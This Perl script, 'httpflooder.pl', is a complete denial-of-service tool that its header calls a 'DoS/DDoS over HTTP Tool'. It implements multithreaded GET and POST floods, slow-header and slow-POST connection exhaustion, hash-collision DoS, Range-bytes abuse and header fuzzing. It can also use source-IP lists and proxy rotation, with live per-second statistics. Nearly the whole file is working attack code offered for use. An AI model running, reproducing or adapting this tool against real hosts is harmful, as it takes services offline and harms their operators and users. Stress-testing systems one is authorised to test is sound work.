#!/usr/bin/perl
#
# httpflooder.pl
# $Id $
#
# Version: 0.1
# Created: 2013-01-30, Bunyamin Demir
#
# Description: DoS/DDoS over HTTP Tool/HTTP Flooder
#
# Release Notes:
# [15.02.2013] : Added HTTP header fuzzer
# [15.02.2013] : Support HTTP and HTTPS request over Proxy
# [17.02.2013] : Added real time statistics per minute with an aditional
#                single thread
# [16.04.2013] : Added Cookie support for Balancer Flood
# [25.04.2013] : Added Basic Authentication support
#

use strict;
use LWP::UserAgent;
use HTML::Parse;
use Getopt::Long;
use Thread;
use IO::Socket;
use threads;
use threads::shared;
use Time::HiRes qw(gettimeofday tv_interval);
use POSIX qw/ceil/;
use MIME::Base64;
use IO::Socket::SSL;

my %stats : shared = ();

$stats{code} = &share({});
$stats{ip}   = &share({});

# ... Get command-line options
my %opt = (host         => 'www.site.com',
	   cookie       => undef,
	   attack       => 'GF',
	   ip           => undef,
	   ips          => undef,
	   url          => '/',
	   urls         => undef,
	   useragent    => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0',
	   useragents   => undef,
	   referer      => undef,
	   referers     => undef,
	   proxy_file   => undef,
	   proxy_host   => undef,
	   proxy_port   => undef,
	   timeout      => 100,
	   interval     => 10,
	   thread       => 1,
	   num          => 1,
	   ulength      => 0,
	   clength      => 1,
	   extension    => undef,
	   ssl          => undef,
	   basicauth    => undef,
	   keepalive    => undef,
	   closehead    => undef,
	   delay        => undef,
	   customcookie => undef,
	   verbose      => 0,
	   port         => 80,
           duration     => 0,
	  );

GetOptions('a|attack=s'     ,\$opt{attack},
	   'h|host=s'       ,\$opt{host},
	   'c|cookie=s'     ,\$opt{cookie},
	   'u|url=s'        ,\$opt{url},
	   'urls=s'         ,\$opt{urls},
	   'p|port=i'       ,\$opt{port},
	   'i|ip=s'         ,\$opt{ip},
	   'ips=s'          ,\$opt{ips},
	   'https'          ,\$opt{ssl},
	   'keepalive'      ,\$opt{keepalive},
	   'closehead'      ,\$opt{closehead},
	   'ua|useragent=s' ,\$opt{useragent},
	   'useragents=s'   ,\$opt{useragents},
	   'referer=s'      ,\$opt{referer},
	   'referers=s'     ,\$opt{referers},
	   'proxy_file=s'   ,\$opt{proxy_file},
	   'phost=s'        ,\$opt{proxy_host},
	   'pport=s'        ,\$opt{proxy_port},
	   'basic-auth=s'   ,\$opt{basicauth},
	   't|thread=i'     ,\$opt{thread},
	   'ulength=i'      ,\$opt{ulength},
	   'clength=i'      ,\$opt{clength},
	   'extension=s'    ,\$opt{extension},
	   'balancer=s'     ,\$opt{balancer},
	   'custom-cookie=s',\$opt{customcookie},
	   'n|num=i'        ,\$opt{num},
	   'interval=i'     ,\$opt{interval},
	   'delay=i'        ,\$opt{delay},
           'duration=s'     ,\$opt{duration},
	   "v|verbose=s"    ,\$opt{verbose},
	   "help"           ,sub { &print_usage; exit(0); },
	  );

sub print_usage {

  print qq
    (HTTP Flooder, v1.0
   Usage: httpflooder.pl [options]
	  [--attack]      -a  : Attack Type GF  => GET Flood,
                                            PF  => POST Flood,
                                            SH  => Slow Headers,
                                            SP  => Slow POST,
                                            HD  => Hash DoS,
                                            MX  => GET/POST Flood,
                                            RB  => Range Bytes,
                                            HF  => HTTP Header Fuzz,
                                            SHF => Slow Header Fuzz
                                            BF  => MX Flood over Balancer
	  [--host]        -h  : Host for attack
	  [--cookie]      -c  : Cookie for HTTP Request Header
	  [--url]         -u  : Request URL
	  [--urls]            : Request URL files
	  [--port]        -p  : Port for HTTP request
	  [--https]           : SSL support
	  [--ip]          -i  : Source IP
	  [--ips]             : Source IPs files
	  [--useragent]   -ua : User-Agent for HTTP Request Header
	  [--useragents]      : User-Agent files for HTTP Request Header
	  [--referer]         : Referer header for HTTP Request
	  [--referers]        : Referer header files for HTTP Requests
	  [--proxy_file]      : Proxy IP list fpr HTTP request over proxy
	  [--keepalive]       : Connection : Keep-Alive Header
	  [--closehead]       : Close header (added CRLF)
	  [--ulength]         : Length for random generated url
	  [--extension]       : File extension for random generated url
	  [--clength]         : Content-Length for slowpost
	  [--thread]      -t  : Thread number for tool.
          [--balancer]        : User balancer
          [--custom-cookie]   : Extract custom Cookie value in response
          [--basic-auth]      : Basic Authentication for HTTP Request
	  [--num]         -n  : Connection number for tool.
	  [--interval]        : Add headers/data/param per request for Slow Headers/POST/Params attack.
	  [--delay]           : Delay per additional header in a request for Slow Headers attack.
	  [--duration]        : Duration for test (second)
          [--verbose]     -v  : verbose output
                                1 => Thread, Host, IP, Response Code
                                2 => Request
                                3 => Request, Response
          [--help]            : Display usage and options

);
}

unless ($opt{attack}) {
  &print_usage;
  exit(-1);
}

print("+---------------| HTTP Flooder, v1.0 |-------------+");
print "\r\n";

$stats{begin_attack} = gettimeofday;

if ($opt{basicauth}) {
  $opt{basicauth} = encode_base64($opt{basicauth});
}

my %reads = ();

&read_list(\%reads,\%opt);

my @threads = ();

my $req_per_thread = ceil($opt{num} / $opt{thread});

for my $th ( 1 .. $opt{thread}) {

  my $t = undef;

  if ($opt{attack} eq 'PF'){
    $t = Thread->new(\&post_flood,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'SH'){
    $t = Thread->new(\&slow_headers,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'SP'){
    $t = Thread->new(\&slow_posts,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'HD'){
    $t = Thread->new(\&hash_dos,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'MX'){
    $t = Thread->new(\&mx_flood,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'RB'){
    $t = Thread->new(\&range_byte,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'HF'){
    $t = Thread->new(\&header_fuzz,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'SHF'){
    $t = Thread->new(\&slow_header_fuzz,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  elsif ($opt{attack} eq 'BF'){
    $t = Thread->new(\&balancer_flood,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  else{
    $t = Thread->new(\&get_flood,\%opt,\%stats,\%reads,$req_per_thread,$th);
  }
  push(@threads,$t);
}

my $time_thread = Thread->new(\&statistics,\%opt,\%stats);
push(@threads,$time_thread);

foreach (@threads) {
  my $num = $_->join;
}

$stats{end_attack} = gettimeofday;

unless ($opt{verbose}) {
  &print_stats(\%stats);
}

# --------------------------------------------------------------------------

sub get_flood {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "GET $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;
    $req .= "\r\n";

    print($socket $req);

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub post_flood {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "POST $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;
    $req .= "Content-Length: 12\r\n";
    $req .= "\r\n";
    $req .= "message=test\r\n";

    print($socket $req);

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub mx_flood {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  my $socket = undef;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = undef;

    if ($url =~ /(.+)\#(.+)/) {
      if ($2) {
	$req  = "POST $1 HTTP/1.1\r\n";
	$req .= "Host: $opt->{host}\r\n";
	$req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
	$req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
	$req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
	$req .= "User-Agent: $uagent\r\n" if $uagent;
	$req .= "Referer: $ref\r\n" if $ref;
	$req .= "Content-Length: ".length($2)."\r\n";
	$req .= "\r\n";
	$req .= "$2\r\n";
      }
    }
    else {
      $req  = "GET $url HTTP/1.1\r\n";
      $req .= "Host: $opt->{host}\r\n";
      $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
      $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
      $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
      $req .= "User-Agent: $uagent\r\n" if $uagent;
      $req .= "Referer: $ref\r\n" if $ref;
      $req .= "\r\n";
    }

    next unless $req;

    print ($socket $req);

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}


# --------------------------------------------------------------------------

sub balancer_flood {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $bcookie    = undef;
    my $breqcount  = 1;
    my $ref        = undef;

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    foreach my $url (@{$reads->{urls}}) {

      my $socket = &_get_socket($opt,$ip);

      # ... For stats
      $stats->{ip}->{$ip}++;

      my $uagent = @{$reads->{uagents}}[rand($reads->{uagent_count})];

      my $req = undef;

      if ($url =~ /(.+)\#(.+)/) {
	if ($2) {
	 $req .= "POST $1 HTTP/1.1\r\n";
	 $req .= "Host: $opt->{host}\r\n";
	 $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
	 $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
	 $req .= "User-Agent: $uagent\r\n" if $uagent;
	 $req .= "Referer: $ref\r\n" if $ref;
	 $req .= "Cookie: $bcookie\r\n" if $bcookie;
	 $req .= "Content-Length: ".length($2)."\r\n";
	 $req .= "\r\n";
	 $req .= "$2\r\n";
	}
      }
      else {
	$req .= "GET $url HTTP/1.1\r\n";
	$req .= "Host: $opt->{host}\r\n";
	$req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
	$req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
	$req .= "User-Agent: $uagent\r\n" if $uagent;
	$req .= "Referer: $ref\r\n" if $ref;
	$req .= "Cookie: $bcookie\r\n" if $bcookie;
	$req .= "\r\n";
      }

      print($socket $req);

      sysread($socket, my $msg, 1024);

      while ($msg =~ /Set\-Cookie\:\s(\S+)\=(\S+)\;/g) {
	$bcookie .="$1=$2; ";
      }

      if ($opt->{customcookie}) {
	while ($msg =~ /$opt->{customcookie}\=(\S+)\s/g) {
	  $bcookie .="$opt->{customcookie}=$1 ";
	}
      }

      $socket->close();

      my $rcode = &_parse_code($stats,$msg);

      $stats->{ccount}++;

      &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};

      if ($opt->{ssl}) {
	$ref = "https://$opt->{host}/$url";
      }
      else {
	$ref = "http://$opt->{host}/$url";
      }

      $breqcount++;
    }
  }
}

# --------------------------------------------------------------------------

sub slow_headers {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "GET $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;

    print($socket $req);

    foreach (1 .. $opt->{interval}) {
     sleep($opt->{delay}) if $opt->{delay};
      $req .= "A$_: B$_\r\n";
      print($socket $req);
    }

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub slow_header_fuzz {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "GET $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;

    print($socket $req);

    foreach (1 .. $opt->{interval}) {
      sleep($opt->{delay}) if $opt->{delay};
      my $a = chr(rand(255));
      my $b = chr(rand(255));
      print($socket  "$a: $b\r\n");
    }

    print($socket "\r\n") if $opt->{closehead};

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub slow_posts {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "POST $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;
    $req .= "Content-Length: $opt->{clength}\r\n";
    $req .= "\r\n";

    print($socket $req);

    foreach (1 .. $opt->{clength}) {
      sleep($opt->{delay}) if $opt->{delay};
      $req .= "c";
      print($socket "$req\r\n");
    }

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub hash_dos {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  my $body   = "a=b";

  foreach (1 .. $opt->{interval}) {
    $body .= "&a$_=b$_";
  }

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "POST $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;
    $req .= "Content-Length: ".length($body)."\r\n";
    $req .= "\r\n";
    $req .= "$body\r\n";

    print($socket $req);

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub range_byte {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  my $pr     = undef;

  foreach (0 .. 1300) {
    $pr .= ",5-$_";
  }

  foreach my $r (1 .. $num) {

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "HEAD $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;
    $req .= "Range:bytes=0-$pr\r\n";
    $req .= "Accept-Encoding: gzip\r\n";

    if ($opt->{keepalive}) {
      $req .= "Connection: Keep-Alive\r\n";
    }
    else {
      $req .= "Connection: close\r\n";
    }

    $req .= "\r\n";

    print($socket $req);

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub header_fuzz {
  my ($opt, $stats, $reads, $num, $thread) = @_;

  foreach my $r (1 .. $num) {

    my $pr     = undef;

    foreach (1 .. $opt->{interval}) {
      $pr .= chr(rand(255));
    }

    my $ip = $reads->{ips}->[$stats->{ccount} % $reads->{ip_count}];

    my $socket = &_get_socket($opt,$ip);

    # ... For stats
    $stats->{ip}->{$ip}++;

    my ($url, $uagent, $ref) = &_reads_count($opt,$reads);

    my $req = "HEAD $url HTTP/1.1\r\n";
    $req .= "Host: $opt->{host}\r\n";
    $req .= "Authorization: Basic $opt->{basicauth}\r\n" if $opt->{basicauth};
    $req .= "Connection: Keep-Alive\r\n" if $opt->{keepalive};
    $req .= "Cookie: $opt->{cookie}\r\n" if $opt->{cookie};
    $req .= "User-Agent: $uagent\r\n" if $uagent;
    $req .= "Referer: $ref\r\n" if $ref;

    print($socket $req);
    print($socket "$pr\r\n");
    print($socket "\r\n") if $opt->{closehead};

    sysread($socket, my $msg, 12);

    $socket->close();

    my $rcode = &_parse_code($stats,$msg);

    $stats->{ccount}++;

    &_logger($opt,$ip,$thread,$req,$rcode,$msg,$stats->{ccount}) if $opt->{verbose};
  }
}

# --------------------------------------------------------------------------

sub read_list {
  my $reads = shift;
  my $opt   = shift;

  # ... Read ips
  if ($opt->{ips} || $opt->{ip}) {

    if ($opt->{ips}) {
      $reads->{ips} = &read_files($opt->{ips})
    }
    else {
      push @{$reads->{ips}}, $opt->{ip};
    }

  }
  elsif ($opt->{proxy_file}) {
    $reads->{ips}  = &read_files($opt->{proxy_file});
  }
  else {
    $opt->{ip} = &get_local_ip_address();
    push @{$reads->{ips}}, $opt->{ip};
  }

  # ... Read urls
  if ($opt->{urls}) {
    $reads->{urls} = &read_files($opt->{urls})
  }
  else {
    push @{$reads->{urls}}, $opt->{url};
  }

  # ... Read useragents
  if ($opt->{useragents}) {
    $reads->{uagents} = &read_files($opt->{useragents})
  }
  else {
    push @{$reads->{uagents}}, $opt->{useragent};
  }

  # ... Read referer
  if ($opt->{referers}) {
    $reads->{referers} = &read_files($opt->{referers})
  }
  else {
    push @{$reads->{referers}}, $opt->{referer};
  }

  $reads->{ip_count}      = scalar(@{$reads->{ips}})      if $reads->{ips};
  $reads->{url_count}     = scalar(@{$reads->{urls}})     if $reads->{urls};
  $reads->{referer_count} = scalar(@{$reads->{referers}}) if $reads->{referers};
  $reads->{uagent_count}  = scalar(@{$reads->{uagents}})  if $reads->{uagents};

  return $reads;
}

# --------------------------------------------------------------------------

sub read_files {
  my $filename = shift;

  my @params = ();

  if (open(my $file, '<', $filename)) {
    while (my $row = <$file>) {
      chomp $row;
      push @params, $row;
    }
  }
  else {
    warn "Could not open file '$file' $!";
  }

  return \@params;
}

# --------------------------------------------------------------------------

sub _print {
  print @_ if $opt{verbose};
}

# --------------------------------------------------------------------------

sub _logger {
  my $opt       = shift;
  my $ip        = shift;
  my $thread    = shift;
  my $request   = shift;
  my $resp_code = shift;
  my $response  = shift;
  my $req_count = shift;

  &_print("\r\n");
  &_print(".................. ($req_count) Request .....................\r\n") if (($opt->{verbose} == 2) || ($opt->{verbose} == 3));
  &_print("Request: $request\r\n") if (($opt->{verbose} == 2) || ($opt->{verbose} == 3));
  &_print("Thread: $thread, Host: $opt->{host}, IP: $ip, Response Code: $resp_code\r\n");
  &_print("Response: $response \r\n") if ($opt->{verbose} == 3);
  &_print("\r\n");
}

# --------------------------------------------------------------------------

sub _reads_count {
  my $opt   = shift;
  my $reads = shift;

  my $url = undef;

  if ($opt->{ulength}) {
      $url = &generate_rondum_url($opt->{ulength});
      if ($opt->{extension}) {
	  $url = "$url.$opt->{extension}";
      }
  }
  else {
      $url = @{$reads->{urls}}[rand($reads->{url_count})];
  }

  my $uagent = @{$reads->{uagents}}[rand($reads->{uagent_count})];
  my $ref    = @{$reads->{referers}}[rand($reads->{referer_count})];

  return ($url,$uagent,$ref);
}

# --------------------------------------------------------------------------

sub _parse_code {
  my $stats = shift;
  my $line  = shift;

  $line =~ /(\d{3})/g;

  $stats->{code}->{$1}++;

  return $1;
}

# --------------------------------------------------------------------------

sub _get_socket {
  my $opt = shift;
  my $ip  = shift;

  my $socket = undef;

    if ($opt->{ssl}) {
      if ($opt->{proxy_file}) {
	$socket = &_proxy_https_request($opt,$ip);
      }
      else {
	$socket = &_https_request($opt,$ip);
      }
    }
    else {
      if ($opt->{proxy_file}) {
	$socket = &_proxy_http_request($opt,$ip);
      }
      else {
	$socket = &_http_request($opt,$ip);
      }
    }

  return $socket;
}

# --------------------------------------------------------------------------

sub _http_request {
  my $opt = shift;
  my $ip  = shift;

  my $socket = IO::Socket::INET->new( PeerAddr  => $opt->{host},
				      PeerPort  => $opt->{port},
				      Proto     => 'tcp',
				      LocalAddr => $ip
				    ) or die("Error :: $!");

  return $socket;

}

# --------------------------------------------------------------------------

sub _https_request {
  my $opt = shift;
  my $ip  = shift;

  my $socket = new IO::Socket::SSL( PeerAddr        => $opt->{host},
				    PeerPort        => $opt->{port},
				    LocalAddr       => $ip,
				    SSL_verify_mode => 'SSL_VERIFY_NONE',
				    Proto           => "tcp"
				  ) or die("Error :: $!");

  return $socket;

}

# --------------------------------------------------------------------------

sub _proxy_http_request {
  my $opt = shift;
  my $ip  = shift;

  $ip =~ /(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})\b/;

  $opt->{proxy_host} = $1;
  $opt->{proxy_port} = $2;

  my $socket = new IO::Socket::INET( PeerAddr => $opt->{proxy_host},
				     PeerPort => $opt->{proxy_port},
				     Proto    => "tcp",
				     Timeout  => 5
				   );


  return $socket;

}

# --------------------------------------------------------------------------

sub _proxy_https_request {
  my $opt = shift;
  my $ip  = shift;

  my $ip  = shift;

  $ip =~ /(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})\b/;

  $opt->{proxy_host} = $1;
  $opt->{proxy_port} = $2;

  my $socket = new IO::Socket::SSL( PeerAddr        => $opt->{proxy_host},
				    PeerPort        => $opt->{proxy_port},
				    SSL_verify_mode => 'SSL_VERIFY_NONE',
				    Proto           => "tcp",
				    Timeout         => 5
				  );

  return $socket;

}

# --------------------------------------------------------------------------

sub generate_rondum_url{
  my $length = shift;

  my @chars=('a'..'z','A'..'Z','0'..'9','_');

  my $string = undef;

  for (1 .. $length){
    $string.=$chars[rand @chars];
  }

  return "/".$string;
}

# --------------------------------------------------------------------------

sub statistics {
  my $opt   = shift;
  my $stats = shift;

  sleep(1);

  my $c = 0;
  my $i = -1;

  my $dr = $opt->{duration} || $opt->{num};

  foreach (1 .. $dr) {
    my ($sec,$min,$hour) = localtime();

    my $cd = undef;
    foreach my $code (keys %{$stats->{code}}) {
       $cd .="($code:$stats->{code}->{$code})";
    }

    print "$hour:$min:$sec | Total Req: $stats->{ccount} | Rate:$c | RespCode:$cd\r\n";
    $c = $stats->{ccount}-$i;
    last if ($stats->{ccount} == $i);
    $i = $stats->{ccount};
    
    sleep(1);
  }

  exit;
}

# --------------------------------------------------------------------------

sub get_local_ip_address {
    my $socket = IO::Socket::INET->new(
        Proto       => 'udp',
        PeerAddr    => '198.41.0.4', # a.root-servers.net
        PeerPort    => '53',
    );

    my $local_ip_address = $socket->sockhost;

    return $local_ip_address;
}

# --------------------------------------------------------------------------

sub print_stats {
  my $s   = shift;

  # .. Time operations
  my $a = [$s->{begin_attack}];
  my $b = [$s->{end_attack}];

  my $elapsed_time = sprintf("%.3f",tv_interval($a,$b));

  print("\r\n+---------------- Statistics --------------+\r\n");
  print "Elapsed time: $elapsed_time \r\n";
  print "Connection count: $s->{ccount} \r\n";
  print "IP count: ".scalar(keys %{$s->{ip}})." \r\n";

  print "\r\nHTTP Response Codes\r\n";
  print "-----------------------\r\n";
  foreach my $code (keys %{$s->{code}}) {
    print "$code : $s->{code}->{$code}\n\r";
  }

#  print "\r\nIPs \r\n";
#  print "-----------------------\r\n";
#  foreach my $ip (keys %{$s->{ip}}) {
#    print "$ip : $s->{ip}->{$ip}\n\r";
#  }
}

# --------------------------------------------------------------------------

1;
